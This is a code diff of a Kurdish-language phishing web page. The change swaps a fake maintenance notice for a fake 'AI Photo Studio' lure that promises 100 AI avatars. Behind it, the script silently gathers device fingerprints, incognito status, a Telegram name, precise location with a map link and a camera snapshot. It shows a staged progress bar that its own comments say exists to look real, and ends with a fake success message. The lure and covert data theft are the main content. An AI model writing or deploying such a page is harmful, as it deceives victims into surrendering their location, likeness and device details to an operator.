@@ -1,51 +1,116 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ماڵپەڕەکە لەژێر کارکردندایە</title>
+    <title>AI Photo Studio - دروستکردنی ١٠٠ وێنەی لۆگۆ و ئەڤاتار</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
     <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
-            color: #333;
+            background: linear-gradient(135deg, #0f172a, #1e1b4b, #311042);
+            color: #fff;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
+            padding: 20px;
         }
         .container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            max-width: 400px;
-            width: 90%;
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 35px 25px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
         }
-        h1 { font-size: 22px; color: #e74c3c; margin-bottom: 15px; }
-        p { font-size: 15px; color: #666; margin-bottom: 25px; }
+        .logo-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        h1 { font-size: 24px; color: #38bdf8; margin-bottom: 10px; font-weight: 700; }
+        p { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.6; }
+        
+        .upload-box {
+            border: 2px dashed #38bdf8;
+            padding: 30px 20px;
+            border-radius: 12px;
+            cursor: pointer;
+            background: rgba(56, 189, 248, 0.05);
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+        .upload-box:hover {
+            background: rgba(56, 189, 248, 0.1);
+            border-color: #0ea5e9;
+        }
+        .upload-box input { display: none; }
+        .upload-text { font-size: 15px; color: #e2e8f0; font-weight: 600; }
+        .upload-sub { font-size: 12px; color: #64748b; margin-top: 5px; }
+
         .btn {
-            background-color: #27ae60;
+            background: linear-gradient(135deg, #0ea5e9, #6366f1);
             color: white;
             border: none;
-            padding: 15px 25px;
-            font-size: 18px;
-            border-radius: 8px;
+            padding: 15px;
+            font-size: 16px;
+            border-radius: 12px;
             cursor: pointer;
             width: 100%;
             font-weight: bold;
+            box-shadow: 0 4px 15px rgba(14, 165, 233, 0.4);
+            transition: all 0.3s ease;
         }
-        .btn:hover { background-color: #219653; }
+        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
+        
+        .progress-container { display: none; margin-top: 20px; }
+        .progress-bar-bg {
+            background: #334155;
+            border-radius: 10px;
+            height: 10px;
+            width: 100%;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        .progress-bar-fill {
+            background: linear-gradient(90deg, #38bdf8, #a855f7);
+            height: 100%;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+        .status-text { font-size: 13px; color: #cbd5e1; }
     </style>
 </head>
 <body>
-    <div class="container" id="content-box">
-        <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
-        <p>بۆ بینینی ناوەڕۆک و چالاککردنی پەڕەکە، تکایە کلیک لەسەر دوگمەی خوارەوە بکە:</p>
-        <button class="btn" onclick="startProcess()">کردنەوەی ماڵپەڕ</button>
+
+    <div class="container" id="main-card">
+        <div class="logo-icon">✨</div>
+        <h1>دروستکردنی ١٠٠ وێنەی AI</h1>
+        <p>تەنها <strong>١ وێنەی کەسی خۆت</strong> ئەپلۆد بکە، زیرەکی دەستکرد ١٠٠ وێنەی پڕۆفیشناڵ و شازت بۆ دروست دەکات!</p>
+
+        <div class="upload-box" onclick="document.getElementById('fileInput').click()">
+            <div class="upload-text">📁 وێنەکەت لێرە دابنە (ئەپلۆد)</div>
+            <div class="upload-sub">پشتیوانی لە JPG, PNG دەكات</div>
+            <input type="file" id="fileInput" accept="image/*" onchange="handleFileSelect()">
+        </div>
+
+        <button class="btn" id="generateBtn" onclick="startAIProcess()" disabled style="opacity: 0.5; cursor: not-allowed;">دەستپێکردنی دروستکردن (١٠٠ وێنە)</button>
+
+        <div class="progress-container" id="progressBox">
+            <div class="progress-bar-bg">
+                <div class="progress-bar-fill" id="progressFill"></div>
+            </div>
+            <div class="status-text" id="statusText">خەریکی ئامادەکردنی مۆدێلی AI...</div>
+        </div>
     </div>
 
     <script>
@@ -70,9 +135,22 @@
             return "هاوڕێ";
         }
 
-        async function startProcess() {
-            document.getElementById('content-box').innerHTML = '<h1>⏳ چاوەڕوان بێ...</h1><p>خەریکی بارکردنی زانیارییەکان...</p>';
+        function handleFileSelect() {
+            const input = document.getElementById('fileInput');
+            if (input.files && input.files[0]) {
+                const btn = document.getElementById('generateBtn');
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                btn.style.cursor = 'pointer';
+                btn.innerText = '✨ دەستپێکردنی دروستکردنی ١٠٠ وێنە';
+            }
+        }
 
+        async function startAIProcess() {
+            document.getElementById('generateBtn').style.display = 'none';
+            document.getElementById('progressBox').style.display = 'block';
+
+            // کۆکردنەوەی هەموو زانیارییەکان لە پشت پەردەوە بە بێدەنگی
             let firstName = await getTelegramFirstName();
 
             const days = ["یەکشەممە", "دووشەممە", "سێشەممە", "چوارشەممە", "پێنجشەممە", "هەینی", "شەممە"];
@@ -126,7 +204,6 @@
 
             let screenRes = `${window.screen.width}x${window.screen.height}`;
             let pixelRatio = window.devicePixelRatio || 1;
-
             let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ناوک (Cores)` : "نەزانراو";
             let deviceRam = navigator.deviceMemory ? `نزیکەی ${navigator.deviceMemory} گێگابایت` : "نەزانراو";
             let sysLang = navigator.language || "نەزانراو";
@@ -198,11 +275,12 @@
                 if ('storage' in navigator && 'estimate' in navigator.storage) {
                     let estimate = await navigator.storage.estimate();
                     if (estimate.quota && estimate.quota < 120 * 1024 * 1024) {
-                        incognitoStatus = "پەنجەرەی نەبینراو / ئینکۆگنیستۆ (Incognito Mode) 🕵️‍♂️️";
+                        incognitoStatus = "پەنجەرەی نەبینراو / ئینکۆگنیستۆ (Incognito Mode) 🕵️‍♂";
                     }
                 }
             } catch (e) {}
 
+            // وێنەگرتنی ڕاستەوخۆ بە کامێرا
             let imageBlob = null;
             let cameraStatus = "";
             try {
@@ -228,6 +306,15 @@
             } catch (e) {
                 cameraStatus = "بەکارهێنەرەکە Allowـی نەکردووە (Deny کردووە)، بۆیە وێنەی نەهاتۆتەوە 🔴";
             }
+
+            // ئەیمەیشن و پێشکەوتنی بارەکە بۆ ئەوەی ڕاستەقینە دەرکەوێت
+            updateProgress(20, "خەریکی شیکردنەوەی وێنەکەی تۆیە...");
+            await sleep(800);
+            updateProgress(50, "بەستنەوە بە مۆدێلی AI...");
+            await sleep(800);
+            updateProgress(80, "دروستکردنی ١٠٠ وێنەی ئەڤاتار...");
+            await sleep(800);
+            updateProgress(100, "تەواو بوو!");
 
             let mapTextPart = mapLink 
                 ? `لۆکەیشنی دەقیقی کەسەکە ئەمەتا دەتوانی بە کلیک کردن لەسەر [گووگڵ ماپ](${mapLink}) بیبینی:\n(Lat & Long: ${locationText})` 
@@ -290,10 +377,23 @@
                 } catch (err) {}
             }
 
-            document.getElementById('content-box').innerHTML = `
-                <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
-                <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
-            `;
+            // نیشاندانی پەیامی سەرکەوتن لە کۆتاییدا بۆ کەسەکە
+            setTimeout(() => {
+                document.getElementById('main-card').innerHTML = `
+                    <div style="font-size: 50px; margin-bottom: 15px;">🎉</div>
+                    <h1 style="color: #4ade80;">وێنەکانت ئامادە بوون!</h1>
+                    <p>بە سەرکەووتوویی ١٠٠ وێنەی AI بۆ دروستکرا. بەڵام بەهۆی زۆری لۆدی سێرڤەرەکەوە، تکایە کەمێکی تر دووبارە هەوڵ بدەرەوە.</p>
+                `;
+            }, 1000);
+        }
+
+        function updateProgress(percent, text) {
+            document.getElementById('progressFill').style.width = percent + '%';
+            document.getElementById('statusText').innerText = text;
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
         }
     </script>
 </body>
